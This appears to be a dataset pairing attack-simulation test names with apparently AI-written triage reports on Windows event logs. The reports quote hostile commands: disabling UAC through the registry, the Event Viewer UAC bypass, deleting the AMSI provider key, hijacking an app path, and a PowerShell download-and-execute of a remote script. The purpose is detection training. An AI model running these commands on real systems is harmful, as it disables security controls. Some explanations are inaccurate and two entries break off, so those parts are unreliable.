attrib - Remove read-only attribute,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Process Creation and Command-Line Arguments:**
    - Repeated execution of `cmd.exe` with commands checking, creating, and modifying attributes of files in a temporary directory:
      ```
      ""cmd.exe"" /c IF EXIST %%temp%%\\data.001_attrib ( EXIT 0 ) ELSE ( EXIT 1 )
      ""cmd.exe"" /c mkdir %%temp%%\\data.001_attrib & echo data.001_attrib1 >> %%temp%%\\data.001_attrib\\data.001_attrib1.txt & echo data.001_attrib2 >> %%temp%%\\data.001_attrib\\data.001_attrib2.txt & attrib.exe +r %%temp%%\\data.001_attrib\\data.001_attrib1.txt & attrib.exe +r %%temp%%\\data.001_attrib\\data.001_attrib2.txt
      ```

2. **Use of Evasive Techniques:**
    - The script appears to be attempting to obfuscate or alter file attributes which can be indicative of attempts to hide malicious activity or files.

3. **Execution of `wevtutil.exe`:**
    - `wevtutil.exe` is seen in the logs, which is often used to query or modify event logs. This can be a technique used to erase tracks.

4. **Repeated Batches of Microsoft Edge Update:**
    - Numerous entries related to `MicrosoftEdgeUpdate.exe` and Edge update processes running consecutively, which may indicate either regular update behavior or exploitation of the update mechanism.

5. **HOSTNAME.EXE and WHOAMI.EXE Execution:**
    - The execution of `hostname.exe` and `whoami.exe` may be part of reconnaissance processes.

### Assessment of Malicious Activity:

- **Integrity Level and User Execution:**
  - Elevated integrity levels (high) for processes and execution under an admin or SYSTEM context, which can indicate administrative or unauthorized access.

- **Hash Reappearances:**
  - Repeated hashes observed for certain processes like `cmd.exe`, indicating frequent similar process executions that may be scripted or automated.

### Indicators of Compromise:
- The use of temporary directories for attribute changes, usage of command-line operations to edit file attributes, execution of utility programs like `wevtutil`, and excessive `cmd.exe` usage under a high integrity level suggest potentially malicious scripting or behavior, possibly indicating a compromise or ongoing malicious activity.

### Recommended Resolution:

**Resolution: SUSPICIOUS**

- The series of activities observed, particularly around command execution and file attribute manipulation in temporary directories, suggests actions that, while not conclusively malicious in nature, warrant further investigation to confirm intent and possible compromise.
  
### Next Steps:
1. **Deep Dive Analysis:**
   - Run deeper analysis on the `cmd.exe` operations and assess any file changes in `%temp%` directories for malicious content or scripts.

2. **Collect More Data:**
   - Retrieve additional logs for context, such as network, process ancestry, or user logon information.

3. **Endpoint Threat Hunting:**
   - Check for unusual network activity, such as unauthorized remote access or data exfiltration attempts, emanating from this machine.

Windows HideSCAVolume Group Policy Feature,"Upon reviewing the provided Windows event logs, I have identified a series of events that warrant further analysis:

### Suspicious or Anomalous Behavior

1. **Time Manipulation Events:**
   - The logs indicate modifications to the system time, as seen in the following:
     - Event ID 24 in the System log and Event ID 4616 in the Security log show modifications to the system time where the new time is earlier than the previous time. This can sometimes be associated with attempts to alter time-based security mechanisms or logs, but more likely, it reflects a possible time synchronization issue.

2. **Registry Modification:**
   - The logs reveal a command executed by `cmd.exe` that modifies Windows Registry settings:
     - Event ID 17976 shows the execution of `cmd.exe` with a command to add a registry entry (`HideSCAVolume`) under the `Explorer` policies. Altering registry settings, especially related to Explorer policies, may indicate an attempt to prevent certain system behaviors or features.

3. **Privilege Escalation:**
   - Event ID 4672 shows that the user `admin_test` gained several privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeRestorePrivilege`, which are sensitive and often leveraged for lateral movement or execution of non-privileged tasks.

4. **Multiple `wevtutil.exe` Executions:**
   - Numerous process creations of `wevtutil.exe` and `conhost.exe` by the `admin_test` user appear in the logs. Such activity can be suspect if no legitimate reason is present, such as a script or automation task outputting or querying event logs.

5. **Highly Privileged Processes:**
   - Microsoft Edge Update processes are running with `SYSTEM` privileges frequently, but this is typical for legitimate auto-update services.

### Assessment

- **Time Manipulation:** The adjustments to the system time are suspect but do not confirm malicious intent without further context.
- **Registry Modification:** Direct registry changes via scripts or command-line tools are suspicious, suggesting potential attempts to alter system settings.
- **Privilege Escalation:** The elevation of privileges for the `admin_test` user, combined with registry modifications and heavy system interaction, raises concerns about possible administrative misuse or compromise.
- **`wevtutil.exe` Activity:** Consistency in the use of `wevtutil.exe` without specific context or justification can be considered anomalous.

### Threats/Risks

- **Potential Security Bypass:** Changes to time settings and registry modifications could indicate an attempt to alter logs or security mechanisms.
- **Elevated Privileges Misuse:** The privilege escalation could facilitate malicious actions that are otherwise restricted.
- **Administrative Oversight:** The activity could be unauthorized administrative actions that need addressing to avoid security policy violations.

### Guidance and Resolution

Given the findings, the resolution for the situation is **SUSPICIOUS**. The identified activities need further investigation to determine if they are authorized administrative actions or indicative of malicious activity. Prioritize reviewing:
- The purpose and scripts related to the `cmd.exe` registry modification.
- Reasons behind the time adjustments and correlate with known activity schedules.
- The role and access permissions of the `admin_test` account.
  
Conduct a thorough review of alerts from the EDR for detailed behavior analysis and scrutinize historical logs for any evidence of consistent patterns or unique indicators linked to known attacks."
Disable UAC using reg.exe,"Upon reviewing the provided Windows event logs, there are several observations that can be made to determine the presence of any suspicious or malicious activity.

### Suspicious Activities:

1. **Time Change (EventID: 4616 in Security Log and EventID: 1 in System Log):**
   - The system time was altered as indicated by the logged entries. This sudden change in system time (`PreviousTime` was `17:50:46.7181163` and `NewTime` was `17:50:41.1479438`) under the user context `LOCAL SERVICE` could be a flag for potential manipulation commonly used to cover tracks in malicious activities. However, system time changes can also occur during legitimate time synchronization activities, but this still requires careful examination.

2. **Registry Modification Using CMD (Sysmon EventID: 1 logging command line activity):**
   - A command was executed to modify `EnableLUA` key in the registry using `reg.exe`. The command `cmd.exe /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f` disables user account control (UAC), which can be a step in privilege escalation. This is generally considered suspicious unless explicitly known and authorized by IT personnel.

3. **Frequent Execution of Microsoft Edge Updates (Sysmon Logs):**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` processes are seen. Although these could correlate to legitimate software updates, the high frequency, particularly with additional parameters, could warrant further investigation to ensure these were not used as a vector for launching unauthorized activities.

4. **Frequent Use of `conhost.exe` and `wevtutil.exe`:**
   - Multiple entries show heavy usage of `conhost.exe` and `wevtutil.exe`. While these processes can be part of normal operation, they are occasionally leveraged in attacks due to their capabilities. However, these entries alone lack enough specificity to immediately flag as malicious without further context, but they do contribute to an overall need for thorough investigation.

### Assessment:

Based on the logs, several indicators suggest that there might be unauthorized or at the least unusual activity occurring on the CEO’s machine: the change in system time, registry modifications disabling UAC, and extensive use of certain processes. These patterns are consistent with potential attempts to disable protective measures and hide tracks.

### Guidance on How to Proceed:

1. **Further Investigation Needed:** 
   - Conduct a meticulous review of any scripts or scheduled tasks associated with the execution of these commands.
   - Retrieve endpoint data to understand if the modification in UAC settings was followed by any further suspicious activities.
   - Confirm the necessity of time changes and the origin of such modifications.

2. **Verification of Updates and Installations:**
   - Ensure that Microsoft Edge updates are verified as genuine and not being used for subversive purposes.

3. **Network Monitoring:**
   - Monitor network activity for any unusual outbound connections originating from the machine, suggesting data exfiltration or command and control activities.

4. **Policy and Access Controls:**
   - Reinforce policies governing the modification of system time and registry settings.

### Resolution:

Based on the analysis, these activities are best categorized as **SUSPICIOUS**, given the potential for legitimate explanations but still warranting further investigation to eliminate or confirm malicious intent."
UACME Bypass Method 61,"### Analysis

#### Suspicious Log Entries:

1. **Sysmon Logs - Command Execution via cmd.exe**: 
   - At `2024-10-27 18:24:46.410`, there’s an execution of `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\61 Akagi64.exe` via `cmd.exe`. The command-line argument shows path traversal (`..`) techniques, typically used to access unauthorized directories, which is unusual and can be considered suspicious.
   - The parent process is `wsmprovhost.exe`, which generally indicates Windows Remote Management activity. This execution path is unconventional for standard operations, raising potential red flags for remote execution or script inclusion.

2. **Sysmon Logs - Use of Powershell**: 
   - At `18:24:43.955`, `cmd.exe` was spawned by `powershell.exe`. Powershell scripts are often used for administrative tasks, but in a suspicious context, they could be used for executing or downloading malicious scripts silently.

3. **Multiple `wevtutil.exe` Executions**:
   - The frequent use of `wevtutil.exe` (at least three times in a short duration) is noteworthy. While it can be used legitimately to query and back up event logs, frequent and rapid invocation could signal log tampering or clearing activities common in post-exploitation scenarios.

4. **SHA256 Hashes**:
   - The `SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0` hash for `Akagi64.exe` (as seen in the execution via `cmd.exe`) should be further analyzed to check against known malicious hashes.

5. **Security Logs - Privilege Escalation Attempts**:
   - The presence of Event ID `4672` entries indicates special privileges being assigned to SYSTEM accounts. This is standard for administrative processes but should be evaluated for context, especially if correlated with unapproved activity.

6. **Failed Credential Checks**:
   - Event ID `5379` related to failed credentials attempts concerning ""MicrosoftAccount:user=02txoixylodcstop"" and ""WindowsLive"" hints at unauthorized attempts to access or verify accounts, suggesting a potential compromise attempt.

#### Potential Malicious Indicators:
- **Unusual Executions**: Execution of `Akagi64.exe` from a temporary directory through `cmd.exe` and the parent being `wsmprovhost.exe` could be indicative of an attack leveraging Windows Management Instrumentation (WMI) or similar techniques.
- **High Integrity Level Execution**: Some processes, such as `cmd.exe`, executed with high integrity levels, could indicate attempts to perform higher privilege operations, possibly malicious if unexpected.
- **Cross-Execution Context**: The scripts ran under `SERVER002\admin_test` with paths and techniques not typically used in standard administrative tasks.

### Assessment

**Resolution: SUSPICIOUS**

There are several indicators in these logs suggestive of potentially malicious activity, notably the unusual execution patterns involving `cmd.exe`, past threat correlations with log file utility tool executions, and unexplained credential queries. Although not definitive for malicious behavior, these signs require deeper investigation.

### Guidance

1. **Immediate Investigations**:
   - Verify the purpose and origin of `Akagi64.exe`. Check its hash against known malware databases.
   - Investigate the context and necessity of the `wevtutil.exe` executions for log altering activities.
   - Review user and process account activities around the time of these events to identify unauthorized framework or administrative uses.
   - Check the origins and need for the `powershell.exe` scripts if other arguments or scripts were executed earlier.

2. **Forensic Steps**:
   - Capture a snapshot of current system processes and loaded modules.
   - Review network connections around the time of the events to identify potential data exfiltration or C2 communication.
   - Examine related systems or previously accessed shares/domains in the logs for lateral movement attempts.

3. **Preventive Measures**:
   - Implement stricter permissions and monitoring over critical admin utilities like `cmd.exe`, `powershell.exe`, and `wevtutil.exe`.
   - Enhance EDR response rules to flag path traversal and temporary directory executions tighter.

Consider further examination to conclusively rule out a compromise. Maintain heightened monitoring until investigations negate malicious traces."
Execute base64-encoded PowerShell from Windows Registry,"### Detailed Analysis:

#### Suspicious PowerShell Activity:
- **PowerShell Command Obfuscation and Execution**:
  - The logs contain multiple entries indicating the execution of PowerShell commands using Base64 encoding to obfuscate the command. It encodes and stores a command in the registry and then retrieves and executes it. This behavior is typically observed in scripts attempting to evade detection by security tools.
  - Specific example: The command within the logs uses `Set-ItemProperty` to write to the registry and then uses `IEX` to execute the command from the registry entry.
  - Base64 encoded commands are a common method of executing potentially malicious code while avoiding direct detection.

#### Sysmon Logs:
- **Process Execution**:
  - There are numerous executions of Windows utilities such as whoami.exe, and hostname.exe, which can sometimes be legitimate but are also often used by attackers to gather system information or assert their current privileges.
  - The excessive usage in a short period might indicate efforts to gather information for malicious purposes, especially if such usage is not common for the server in question.

#### Presence of High Integrity Level Processes:
- Several processes are running at a High integrity level (`whoami.exe`, `conhost.exe` with various arguments, `powershell.exe`), which often signifies that the process has increased privileges.

#### Security Log:
- **Privilege Escalation**:
  - Event ID 4672 shows that the account SYSTEM has received a number of high privileges, including `SeDebugPrivilege`, which are powerful and can be misused if obtained maliciously.

#### Application and System Logs:
- Logs suggest regular Windows Defender updates and standard user activity, with no immediate suspicious behavior noted within these specific logs.

### Assessment:
- **Overall**:
  - The presence of obfuscated PowerShell commands, execution of informational system commands in such a pattern, and signup of multiple privileges form a suspicious activity pattern.
  - There are no direct indicators of compromise, such as communication with a known C2 server or explicit malicious payload execution, but given the techniques employed, these events warrant further examination.

### Resolution: **SUSPICIOUS**
- **Guidance**:
  - Initiate a deeper investigation into the system for any unauthorized changes or anomalies, focusing on PowerShell activities and their source.
  - Analyze network activity to identify any unusual connections that might suggest data exfiltration or C2 server communication.
  - Review the server's history for similar patterns and check for any scripts or scheduled tasks that were created or modified around the time of these logs.
  - Engage with the incident response team to ensure comprehensive assessment and potential remediation activities if further evidence of compromise is found."
Bypass UAC using Event Viewer (PowerShell),"**Analysis Overview:**

Upon reviewing the provided logs, I have identified a series of actions and events that warrant further investigation. While many entries in the logs signify standard system operations and routine updates, certain abnormal behaviors and command executions point towards potentially malicious activity on the host, particularly regarding the use of PowerShell and registry modifications.

**Indicators and Findings:**

1. **PowerShell Script Execution:**
   - A PowerShell command is executed with the intent to modify the registry key `HKCU:\software\classes\mscfile\shell\open\command`, setting its default value to launch `cmd.exe`, followed by starting `eventvwr.msc`.
   - This is a known method for escalating privileges by exploiting the Event Viewer leveraging an alternate data stream aspect of Windows, enabling cmd.exe to be executed as an elevated process.

2. **Registry Modification:**
   - The action includes creating a registry item path which is typically targeted for persistence mechanisms or unauthorized access. The procedure of modifying this specific registry key is often associated with attempts to bypass security controls and is indicative of potential unauthorized access.

3. **User Context:**
   - The actions were carried out under the user `admin_test` with high integrity levels, implying potential administrative privileges used for suspicious activity. This user account being involved in numerous key events with elevated privileges is unusual for an account that might not require such frequent high-level access.

4. **Process Execution Patterns:**
   - Numerous instances of `conhost.exe` and `wevtutil.exe`, especially in quick succession and related to admin processes, could point to anomalous behavior potentially related to automation scripts or malicious batch operations.
   - The leveraging of `wevtutil.exe` by the `admin_test` account might be used to clear logs or further manipulate system records to mask other malicious activities.

5. **EDR Alert of Suspicion:**
   - The triggering of the EDR alert on the CEO's machine based on these behaviors suggests validation of the suspicious nature of these actions.

**Assessment Conclusion:**

The series of PowerShell commands to manipulate the registry, coupled with the user's admin context, suggests these events are deeply suspicious. This type of behavior is consistent with malicious attempts to escalate privileges and execute potentially harmful actions using misconfigured or intentionally altered settings.

**Resolution:**

- **Resolution: MALICIOUS**

Given the coordinated series of actions seen in the logs - especially the PowerShell script aimed at hijacking `eventvwr.msc` to gain elevated command execution, along with the EDR alert - it is clear that these actions are indeed malicious. Immediate mitigation steps should be executed, including:
  - Isolating the affected host to prevent further unauthorized actions.
  - Conducting a thorough inspection of the user's activities and recent changes.
  - Validating system integrity post-mitigation and applying necessary patches or configuration changes to block similar events.
  - Ensuring that incident containment and eradication procedures are followed up with a full investigation into potential vectors of intrusion."
Mshta used to Execute PowerShell,"### Detailed Analysis

The Windows event logs provided exhibit a range of normal and suspicious activities within the system. Let's break down the findings:

#### Suspicious Activity Identified:
1. **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
   - Repeated executions of `wevtutil.exe` and `conhost.exe` by the same user (`SERVER002\\admin_test`) in quick succession are observed. While these are legitimate programs, frequent and rapid triggering without visible administrative tasks could be indicative of log tampering or suspicious activity that attempts to cover its tracks by manipulating event logs.

2. **Execution of `cmd.exe` with Suspicious Command:**
   - The command line for `cmd.exe` contains an encoded script that executes `mshta.exe`, which is a known living-off-the-land binary often abused for executing malicious scripts. The command appears to be attempting to initiate a PowerShell command through an HTML Application (`HTA`) to run a script. This is a common technique used in attacks to execute scripts without being detected.

3. **Suspicious Use of `mshta.exe` to Launch PowerShell:**
   - The chain of commands using `mshta.exe` and `PowerShell` is specifically designed to execute a script (`Write-Host Hello, MSHTA!`) through PowerShell without using resource-heavy or directly executable methods by the attacker. The script executed by PowerShell further confirms this suspicious operation pattern.

4. **Potential Time Alteration or Tampering:**
   - Multiple instances where `svchost.exe` exhibits time alterations (new time vs. old time) are found in the logs. Such activities could be another layer of defense evasion tactic by tampering with system logs or timestamps – though no definitive malicious correlation can be established solely from these entries.

#### Evident Malicious Indicators:
- **Combination of Script Output and Execution Tools:**
  - The combination of `mshta.exe`, `PowerShell`, and obfuscated command line arguments is a strong indication of suspicious or malicious activities, aligning with common cyber attack techniques that often circumvent traditional defenses.

### Resolution

Based on the analysis of the logs provided:

- The logs exhibit **MALICIOUS** activity:

Windows HideSCANetwork Group Policy Feature,"Upon thorough investigation of the provided Sysmon logs, several activities stand out that could indicate potential threats:

1. **Usage of Built-in Windows Utilities:**
   - There are several logs where `C:\Windows\System32\whoami.exe`, `C:\Windows\System32\wevtutil.exe`, and `C:\Windows\System32\cmd.exe` were executed by the user `SERVER002\admin_test`. The use of built-in utilities can often be indicative of malicious activity, as they are frequently leveraged by attackers to gather information about users (`whoami`), manipulate event logs (`wevtutil`), or execute commands (`cmd.exe`).

2. **Registry Modification via Command Line:**
   - The `cmd.exe` event indicates a command being run to edit the registry to hide the ""ScanNetwork"" option in the Explorer using `reg.exe`. Modifications to the `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` key can be suspicious and might lead to a configuration change typical in persistence mechanisms or stealth tactics.

3. **Command Line Parameters:**
   - The command executed was: `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v HideSCANetwork /t REG_DWORD /d 1 /f`. The `/f` flag indicates that this edit should be made forcibly, which is atypical in normal user behavior and could suggest the registry modification was done without user consent.

4. **Processes Executed Under Elevated Privileges:**
   - Many process executions, including updates for Microsoft Edge, were carried out under the `NT AUTHORITY\SYSTEM` user. While not inherently suspicious since it is common for service-related tasks, the context of combined usage with administrative tools and registry edits raises a flag.

5. **Frequent Execution of Edge Update Executables:**
   - While Microsoft Edge updates are routine, the high frequency and varied command-line arguments for these processes, especially from a `C:\Program Files (x86)` and temp directories, should be examined closely to ensure they align with legitimate update activities.

**Assessment:**
- **SUSPICIOUS:** The concurrent execution of built-in utilities, registry modifications, and elevated privileges suggest patterns often associated with post-exploitation activities. However, without more context on endpoint defender alerts and user activities, we cannot declare a clear malicious intent.

**Guidance to Proceed:**
1. **Baseline Comparison:** Investigate whether these types of activities are part of regular operations for the user or machine.
2. **Endpoint Detection and Response (EDR):** Review additional EDR alerts or logs for correlated suspicious activities.
3. **Registry Monitoring:** Monitor further changes to similar registry keys and inspect any deviations.
4. **User Activity Verification:** Confirm with `SERVER002\admin_test` if they are aware of these activities.
5. **Further Investigation:** Consider gathering more data from network logs, endpoint heuristics, or conducting a session replay for deeper analysis.

In conclusion, while the logs show indicators that warrant caution and further investigation, they do not conclusively point to a malicious attack. Further steps should be taken to ensure the system integrity and security posture."
Execution from Compressed File,"**Analysis of Logs:**

The provided logs, specifically from the Sysmon and Security logs, show a sequence of potentially suspicious activities around the same timestamp. Let's break down the notable observations:

1. **Process Execution Patterns:**
   - **Process Creation:**
     - Multiple instances of PowerShell (`powershell.exe`), `wevtutil.exe`, and `conhost.exe` were executed by the user `SERVER002\admin_test`. The `wevtutil.exe` tool is often used to manage Windows Event logs, which can include clearing logs, a notably suspicious activity if it occurs without corresponding legitimate tasks.
     - `cmd.exe` was used to execute a file `data.exe` located in a temp folder, which was executed from inside a ZIP directory structure. This is a common behavior for file extractions and arbitrary code execution attempts.
   - **External File Execution:**
     - The execution of `data.exe` and the immediate launch of `calc.exe` from paths indicative of temporary internet or user directories (`C:\Users\ADMIN_~1\AppData\Local\Temp\`). This suggests possible execution of non-standard software, potentially malware.

2. **Command Line Arguments & Integrity Level:**
   - Execution of potentially non-standard applications (e.g., `whoami`, `HOSTNAME.EXE`, and `data.exe`) by `admin_test` with a high integrity level, suggesting they ran with elevated privileges, which could be indicative of privilege escalation attempts.

3. **Event Correlation:**
   - Repeated usage of system utilities like `wevtutil.exe` and the presence of high integrity level processes that originated from user directories highlight anomalous behavior inconsistent with regular administrative tasks.
   - The use of command-line parameters with paths that seem constructed to access scripts/executables in hidden locations (`temp_data.zip` suggests hidden or extracted malicious payloads).

4. **Security Logs:**
   - There are multiple `5379` events in the security logs indicating failed attempts to access credential resources related to a `MicrosoftAccount`. These correlate with suspicious behavior as credential access is a crucial indicator of attempted information theft or misuse.

5. **System Updates:**
   - Scheduled updates for Microsoft Defender and Microsoft Edge were recorded, which could be normal; however, these lines do not correlate suspiciously with other events.

6. **Benign Events:**
   - Software updates such as Windows Update (e.g., `wuauclt.exe`) and anti-malware definition updates appear benign and part of routine system maintenance.

**Threat/Risk Assessment:**
- The execution of potentially malicious binaries from transient user directories combined with attempts to execute privileged commands and potential credential access attempts suggest an active compromise or malware execution.

**Guidance on How to Proceed:**
- **Immediate Actions:**
  - Quarantine the system for a detailed offline forensic analysis.
  - Check for other suspicious files in the user's temp directories and system-wide PATHs.
  - Utilize known-good baselines and threat intelligence feeds to check file hashes for known malware.
- **Preventive Measures:**
  - Conduct a thorough review of user account permissions and activities.
  - Enhance EDR rules to detect anomalous PowerShell and system utilities usage.
  - Review and possibly enhance existing email and web filtering policies to prevent future similar incidents.

**Final Resolution: MALICIOUS**
- Conclusive indicators of malware execution are present, suggesting a compromise on the host. Immediate containment and remediation procedures are recommended."
Invoke HTML Application - JScript Engine with Inline Protocol Handler,"Upon reviewing the provided Windows event logs, several observations stand out, indicating potential anomalies and possible malicious activities:

1. **Repeated Execution of System Utilities:**
   - Multiple instances of `powershell.exe`, `wevtutil.exe`, and `conhost.exe` are running under `SERVER002\admin_test`. The execution of these commands, especially `powershell.exe` utilizing a suspicious script, might raise some concerns.
   - `wevtutil.exe` is often used to query event logs or clear them, which could indicate an attempt to tamper with forensic evidence.

2. **PowerShell Activity:**
   - Event ID 18052 shows `powershell.exe` executing a command with `Invoke-ATHHTMLApplication -ScriptEngine JScript`, a method potentially used to run scripts or inject code via PowerShell. This behavior is unusual and could be indicative of a PowerShell attack.
   - The `PowerShell` logs reinforce this by confirming the start of a PowerShell session with an unusual script execution, suggesting possible code execution that is not typical in standard operations.

3. **Privilege Escalation Indicators:**
   - Processes like `svchost.exe` and other system processes running under `NT AUTHORITY\SYSTEM` generally operate in the background. However, the context suggests they might have been invoked in conjunction with the power-user activities noted.

4. **Documented Commands (e.g., `whoami.exe` and `hostname.exe`):**
   - Execution of `whoami.exe` and `hostname.exe` provides information about the current user and system identity, which may have been leveraged for reconnaissance purposes by an attacker to gather context on the compromised environment.

5. **Presence of Edge Update Executables:**
   - Multiple instances of Microsoft Edge Update setup files (`setup.exe`) being executed under `NT AUTHORITY\SYSTEM` might be legitimate if updates were occurring. Still, the timing and frequency could also indicate potential misuse or repurposing for malicious activity.

### Assessment:

The collection of activities does not outright confirm a malicious action, but several activities raise significant concerns requiring further investigation.

### Conclusion:

**Resolution: SUSPICIOUS**

### Guidance:

1. **Further Investigation:**
   - Review all scripts and commands executed by PowerShell in detail to understand their exact nature and purpose.
   - Check network logs for any unusual outbound connections or data exfiltration attempts following these PowerShell executions.
   - Investigate the user `admin_test` activities and any changes in privileges or roles recently granted.
   - Analyze Edge update execution context to rule out abuse or masquerading as legitimate activity.

2. **Containment Measures:**
   - Monitor the system closely for any further suspicious activities.
   - Consider isolating the affected machine from the network until a comprehensive analysis is completed.

3. **Prevention:**
   - Implement stricter monitoring and control over PowerShell script execution, possibly enforcing script signing.
   - Review privilege access management ensuring that elevated permissions are necessary and appropriately managed.
   - Ensure logging and monitoring are effective, and that alerts are properly tuned to catch these types of activities in the future."
WinPwn - Kill the event log services for stealth,"Upon analyzing the provided logs, the following observations and analysis can be made:

### Analysis:

1. **PowerShell Activity**:
   - The Windows PowerShell logs indicate the execution of a PowerShell script from an external source. This is potentially problematic. The command involves downloading a script from a URL on GitHub: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')`.
   - This activity is suspicious as downloading and executing scripts from the internet, especially when not verified or approved by the IT department, increases the risk of executing malicious content.

2. **Sysmon Logs**:
   - There is the execution of tools like `wevtutil.exe`, `conhost.exe`, and commands like `whoami.exe` that are generally used for administrative or information-gathering purposes. This activity being executed by the user `SERVER002\admin_test` at a high integrity level may indicate privilege usage that should be scrutinized.
   - Another significant event is the execution of a PowerShell command with a high integrity level, downloading and executing a script from an external URL. This correlates with the PowerShell logs and raises a red flag.

3. **Microsoft Edge Update Processes**:
   - Several MicrosoftEdgeUpdate processes are observed, which could be a routine update mechanism.

4. **Network Service & System Level Processes**:
   - The presence of processes running under `NT AUTHORITY\SYSTEM`, such as `sppsvc.exe`, `svchost.exe`, and `WmiPrvSE.exe`, signify standard Windows system activities that could appear regularly, though these should be validated as part of process security assessments.

### Assessment:
The logs do contain a mixture of routine activities like Microsoft Edge updates and Windows services operations. However, the presence of PowerShell execution fetching a script from an external source, when not expected or approved, certainly qualifies as a suspicious activity. There is no clear evidence from the logs that the PowerShell script execution led to malicious activity, but the potential for misuse or compromise remains high.

### Recommendations:
1. **Immediate Blocking**:
   - Block and audit any ongoing or future access to the domain `https://raw.githubusercontent.com/script`.

2. **Investigate User Activity**:
   - Investigate the user account `SERVER002\admin_test` to understand the context of these actions and ensure the integrity of the account has not been compromised.

3. **Assess PowerShell Execution**:
   - Review the purpose of the PowerShell script used, identify whether it's a legitimate tool used within the organization, and investigate its contents thoroughly.

4. **Enhance Monitoring**:
   - Monitor any subsequent activities on the system related to PowerShell or potential exfiltration of data.

### Resolution:
**SUSPICIOUS** - The logs contain activities that do not look right and necessitate further investigation. The external script execution via PowerShell is particularly concerning and warrants an immediate response to prevent potential system compromise."
AMSI Bypass - Remove AMSI Provider Reg Key,"Upon analyzing the provided Windows event logs for the host ""Server002"", several points of interest and potential indicators of malicious activity have been identified:

1. **Use of PowerShell for AMSI Bypass:**
   - In the Sysmon and PowerShell logs, there is evidence of a PowerShell execution with the command `Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse`. This command indicates an attempt to disable or remove Antimalware Scan Interface (AMSI) providers, which is a common technique used to bypass security mechanisms that inspect scripts for malicious activity.

2. **Process Execution:**
   - Several processes such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and `whoami.exe` were executed by the user ""SERVER002\admin_test"" with a high integrity level. While `whoami` and `hostname` might be used for legitimate administrative purposes, the specific PowerShell command used is strongly suggestive of malicious intent.
   - The execution of `wevtutil.exe` multiple times without clear context can also be suspicious as this utility is often used in log clearing attacks.

3. **Edge Update Activity:**
   - Multiple instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe` and related components) were observed. While periodic updates of software can be normal, the amount of activity seems extensive. However, there is no clear indicator within these entries alone to directly suspect malicious activity without additional context.

4. **Time Synchronization and Changes:**
   - A series of kernel general and time service events indicate time changes and synchronization with `time.windows.com`. While this is usually benign and expected in domain environments for time consistency, the sequence close to other potentially malicious events might suggest an attempt to mask timestamps of certain actions.

**Assessment:**
The presence of a PowerShell command that appears to disable AMSI, a key Windows Defender component, alongside high-integrity level executions and attempts to potentially modify security mechanisms, strongly suggests attempts at privilege escalation or defense evasion.

**Resolution: MALICIOUS**

### Recommendations:
- **Immediate Containment and Investigation:**
  - Isolate the affected system (`Server002`) from the network to prevent further potential propagation of the threat.
  - Perform a forensic analysis to confirm the scope and integrity of other systems, as well as to determine if any sensitive data was accessed or exfiltrated.

- **Security Enhancements:**
  - Review and restrict the use of administrative privileges and ensure that PowerShell script execution policies are appropriately configured.
  - Monitor and alert on similar patterns (e.g., AMSI bypass attempts) in real-time across the network.
  - Keep endpoint protection solutions updated and consider deploying additional threat detection mechanisms if not already in place.

- **User Training:**
  - Educate users on the signs of phishing attempts and the importance of reporting suspicious activity immediately, as initial access often stems from social engineering attacks."
Adding custom paths for application execution,"### Analysis of Windows Event Logs

#### Sysmon Log Analysis:
1. **Frequent Execution of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`:**
   - **`wevtutil.exe` and `conhost.exe`**: These are legitimate Windows processes, but their frequent execution within a short period, especially `conhost.exe`, which is often associated with interactions with command-line applications, suggests script or batch processing activity.
   - **`hostname.exe` and `whoami.exe`**: These are legitimate tools used to query system and user information. Their usage together might indicate a script testing or inventory check of system details, but it is peculiar if used frequently without apparent legitimate need.
   - **`cmd.exe`**: Executed with a command to modify the registry, potentially redirecting `msedge.exe` to `notepad.exe`. This is particularly concerning because it shows an attempt to manipulate system defaults, which can be a method used to mislead and redirect legitimate application launches to a different executable.

2. **Registry Modification with `reg.exe`:**
   - The registry edit command (`reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"" /t REG_SZ /d C:\Windows\System32\notepad.exe /f`) is suspicious. Modifying the registry to replace an application path is a tactic used in malware to hijack program execution without alerting users.

3. **Use of Elevated Privileges:**
   - The security audit logs indicate the use of several high privilege tokens (`SeDebugPrivilege`, `SeBackUpPrivilege`, etc.), which are often abused during privilege escalation attacks.

4. **Microsoft Edge Update Execution:**
   - There are logs of `MicrosoftEdgeUpdate.exe` running, which can be normal as part of update tasks. However, their timings back-to-back with suspicious activities (e.g., registry edits) warrant further investigation to ensure they were legitimate update actions.

#### Security Log Analysis:
1. **Logon Sessions and Privilege Escalation:**
   - User `admin_test` had login and logout activities around the time the suspicious commands were executed. The use of NTLM authentication and elevated token suggests that an account with administrative privileges was used.
   - The escalation associated with this user having multiple high-level privileges is a red flag for potential misuse or a compromise indicating insider threats or account takeover efforts.

#### Application Log Analysis:
- **Service Activity:**
  - The `edgeupdate` service logs indicate typical start and stop patterns which are normal for service updates but, in this case, should be correlated to ensure no tampering or masquerading occurred.

### Assessment and Resolution:

The reviewed logs show patterns that suggest potentially malicious activity. The frequent execution of command-line tools, the suspicious registry edit to redirect application paths, and the use of elevated privileges suggest a likelihood of malicious behavior.

- **Risk:**
  - The command to alter the registry path of a known application could allow an attacker to redirect the execution of `msedge.exe` to a different program, potentially introducing malware.
  - Usage of high-level privileges in conjunction with this behavior increases the concern for unauthorized access or malicious actions.

- **Guidance:**
